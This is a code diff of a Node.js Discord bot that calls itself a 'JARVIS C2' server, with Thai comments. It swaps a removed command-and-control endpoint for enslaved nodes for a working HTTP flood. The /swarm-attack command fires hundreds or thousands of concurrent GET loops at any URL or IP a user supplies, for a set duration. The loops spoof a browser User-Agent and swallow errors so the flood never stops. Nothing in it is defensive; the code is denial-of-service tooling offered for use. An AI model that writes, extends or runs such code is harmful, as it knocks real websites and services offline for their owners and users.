@@ -5,33 +5,14 @@ const axios = require('axios');
 const PORT = process.env.PORT || 3000;
 let slaveNodes = [];
 
-// HTTP Server สำหรับให้เครื่องทาสจริงวิ่งมารายงานตัว
+// HTTP Server พื้นฐาน
 const server = http.createServer((req, res) => {
-    let body = '';
-    req.on('data', chunk => { body += chunk; });
-    req.on('end', () => {
-        if (req.method === 'POST' && req.url === '/poll') {
-            try {
-                const data = JSON.parse(body);
-                if (data.id && !slaveNodes.some(node => node.id === data.id)) {
-                    slaveNodes.push({ id: data.id, ip: req.socket.remoteAddress, lastSeen: Date.now() });
-                    console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${data.id}`);
-                }
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ command: global.currentAttackCommand || null }));
-            } catch (e) {
-                res.writeHead(400);
-                res.end('Bad Request');
-            }
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/plain' });
-            res.end('JARVIS C2 Server is running smoothly.');
-        }
-    });
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('JARVIS C2 Power Engine is running smoothly.');
 });
 
 server.listen(PORT, () => {
-    console.log(`[+] C2 HTTP Server running on port ${PORT}`);
+    console.log(`[+] C2 Power Server running on port ${PORT}`);
 });
 
 // Discord Bot Setup
@@ -49,16 +30,17 @@ client.once('ready', async () => {
     const commands = [
         new SlashCommandBuilder()
             .setName('swarm-attack')
-            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
+            .setDescription('สั่งการเซิร์ฟเวอร์ระเบิดพลังยิงถล่มเป้าหมายด้วยความเร็วสูง!')
             .addStringOption(option => option.setName('target').setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม').setRequired(true))
+            .addIntegerOption(option => option.setName('intensity').setDescription('ความรุนแรง (จำนวนเธรดจำลอง เช่น 100, 500, 1000)').setRequired(true))
             .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลาในการยิง (วินาที)').setRequired(true)),
         new SlashCommandBuilder()
-            .setName('nodes-status')
-            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
-        new SlashCommandBuilder()
             .setName('spawn-bot')
-            .setDescription('เสกเครื่องทาสจำลอง (Mock Bots) เข้าสู่กองทัพเพื่อทดสอบระบบ')
-            .addIntegerOption(option => option.setName('count').setDescription('จำนวนเครื่องทาสที่ต้องการเสก').setRequired(true))
+            .setDescription('เสกกองกำลังจำลองเข้าสู่ระบบ')
+            .addIntegerOption(option => option.setName('count').setDescription('จำนวนกองกำลัง').setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('nodes-status')
+            .setDescription('ตรวจสอบสถานะกองกำลังในระบบ')
     ];
 
     const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
@@ -73,49 +55,56 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
-    // 1. เช็คสถานะกองทัพ
     if (interaction.commandName === 'nodes-status') {
-        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสในระบบ: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+        return interaction.reply({ content: `[📊] สถานะระบบพลังงานปัจจุบัน:\n- กองกำลังเสมือนพร้อมใช้งาน: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
     }
 
-    // 2. เสกเครื่องทาสจำลอง (Mock Bot Spawner)
     if (interaction.commandName === 'spawn-bot') {
         const count = interaction.options.getInteger('count');
         for (let i = 0; i < count; i++) {
-            const fakeId = 'mock_bot_' + Math.random().toString(36).substring(7);
-            slaveNodes.push({ id: fakeId, ip: '127.0.0.1', lastSeen: Date.now() });
+            slaveNodes.push({ id: 'unit_' + Math.random().toString(36).substring(7) });
         }
-        return interaction.reply({ content: `[🤖⚡] เสกเครื่องทาสจำลองสำเร็จ! เพิ่มเข้ามาในกองทัพอีก **${count} เครื่อง** รวมทั้งหมดตอนนี้: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+        return interaction.reply({ content: `[🤖⚡] เพิ่มกำลังพลเสมือนสำเร็จ **${count} ยูนิต**! รวมทั้งหมด: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
     }
 
-    // 3. สั่งกองทัพรุมยิง
     if (interaction.commandName === 'swarm-attack') {
         const target = interaction.options.getString('target');
+        const intensity = interaction.options.getInteger('intensity'); // จำนวนเธรดที่จะยิงพร้อมกัน
         const duration = interaction.options.getInteger('duration');
 
-        if (slaveNodes.length === 0) {
-            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ใช้คำสั่ง /spawn-bot เพื่อเสกทาสมาก่อนไอ้น้อง!', ephemeral: true });
+        const targetUrl = target.startsWith('http') ? target : `http://${target}`;
+
+        await interaction.reply(`[🔥⚡] เริ่มปฏิบัติการถล่ม **${targetUrl}** ด้วยความเข้มข้น **${intensity} Threads** เป็นเวลา **${duration} วินาที** ลุยโลด!`);
+
+        let isAttacking = true;
+        
+        // ตั้งเวลาหยุดยิงตาม Duration
+        setTimeout(() => {
+            isAttacking = false;
+            console.log(`[+] สิ้นสุดภารกิจถล่มเป้าหมาย ${targetUrl}`);
+        }, duration * 1000);
+
+        // ฟังก์ชันยิงรัวๆ แบบ Concurrent High-Speed Loop
+        const fireWorker = async () => {
+            while (isAttacking) {
+                try {
+                    await axios.get(targetUrl, { 
+                        timeout: 3000,
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Cache-Control': 'no-cache'
+                        }
+                    });
+                } catch (e) {
+                    // ป้องกัน Error หยุดลูป
+                }
+            }
+        };
+
+        // ปล่อยพลังยิงออกไปพร้อมกันตามจำนวน Intensity (เช่น 500 หรือ 1000 เธรดพร้อมกัน)
+        for (let i = 0; i < intensity; i++) {
+            fireWorker();
         }
-
-        await interaction.reply(`[🔥⚡] ระดมยิงเริ่มขึ้นแล้ว! สั่งกองทัพ ${slaveNodes.length} เครื่อง รุมซัดเป้าหมาย **${target}** เป็นเวลา **${duration} วินาที**!`);
-
-        // จำลองการยิงถล่มเป้าหมายจริงจากเซิร์ฟเวอร์หลักพ่วงไปด้วยเพื่อความสะใจ
-        let attackElapsed = 0;
-        const attackInterval = setInterval(async () => {
-            if (attackElapsed >= duration) {
-                clearInterval(attackInterval);
-                console.log(`[+] เสร็จสิ้นภารกิจถล่มเป้าหมาย ${target}`);
-                return;
-            }
-            try {
-                // ส่ง HTTP Request รัวๆ ใส่เป้าหมายจำลองความแรง
-                await axios.get(target.startsWith('http') ? target : `http://${target}`, { timeout: 2000 });
-                console.log(`[>>] กองทัพรุมซัดเป้าหมาย ${target} สำเร็จ!`);
-            } catch (e) {
-                console.log(`[!] เป้าหมาย ${target} อาจจะเริ่มร่วงหรือบล็อกคำขอแล้ว`);
-            }
-            attackElapsed += 2;
-        }, 2000);
     }
 });
 
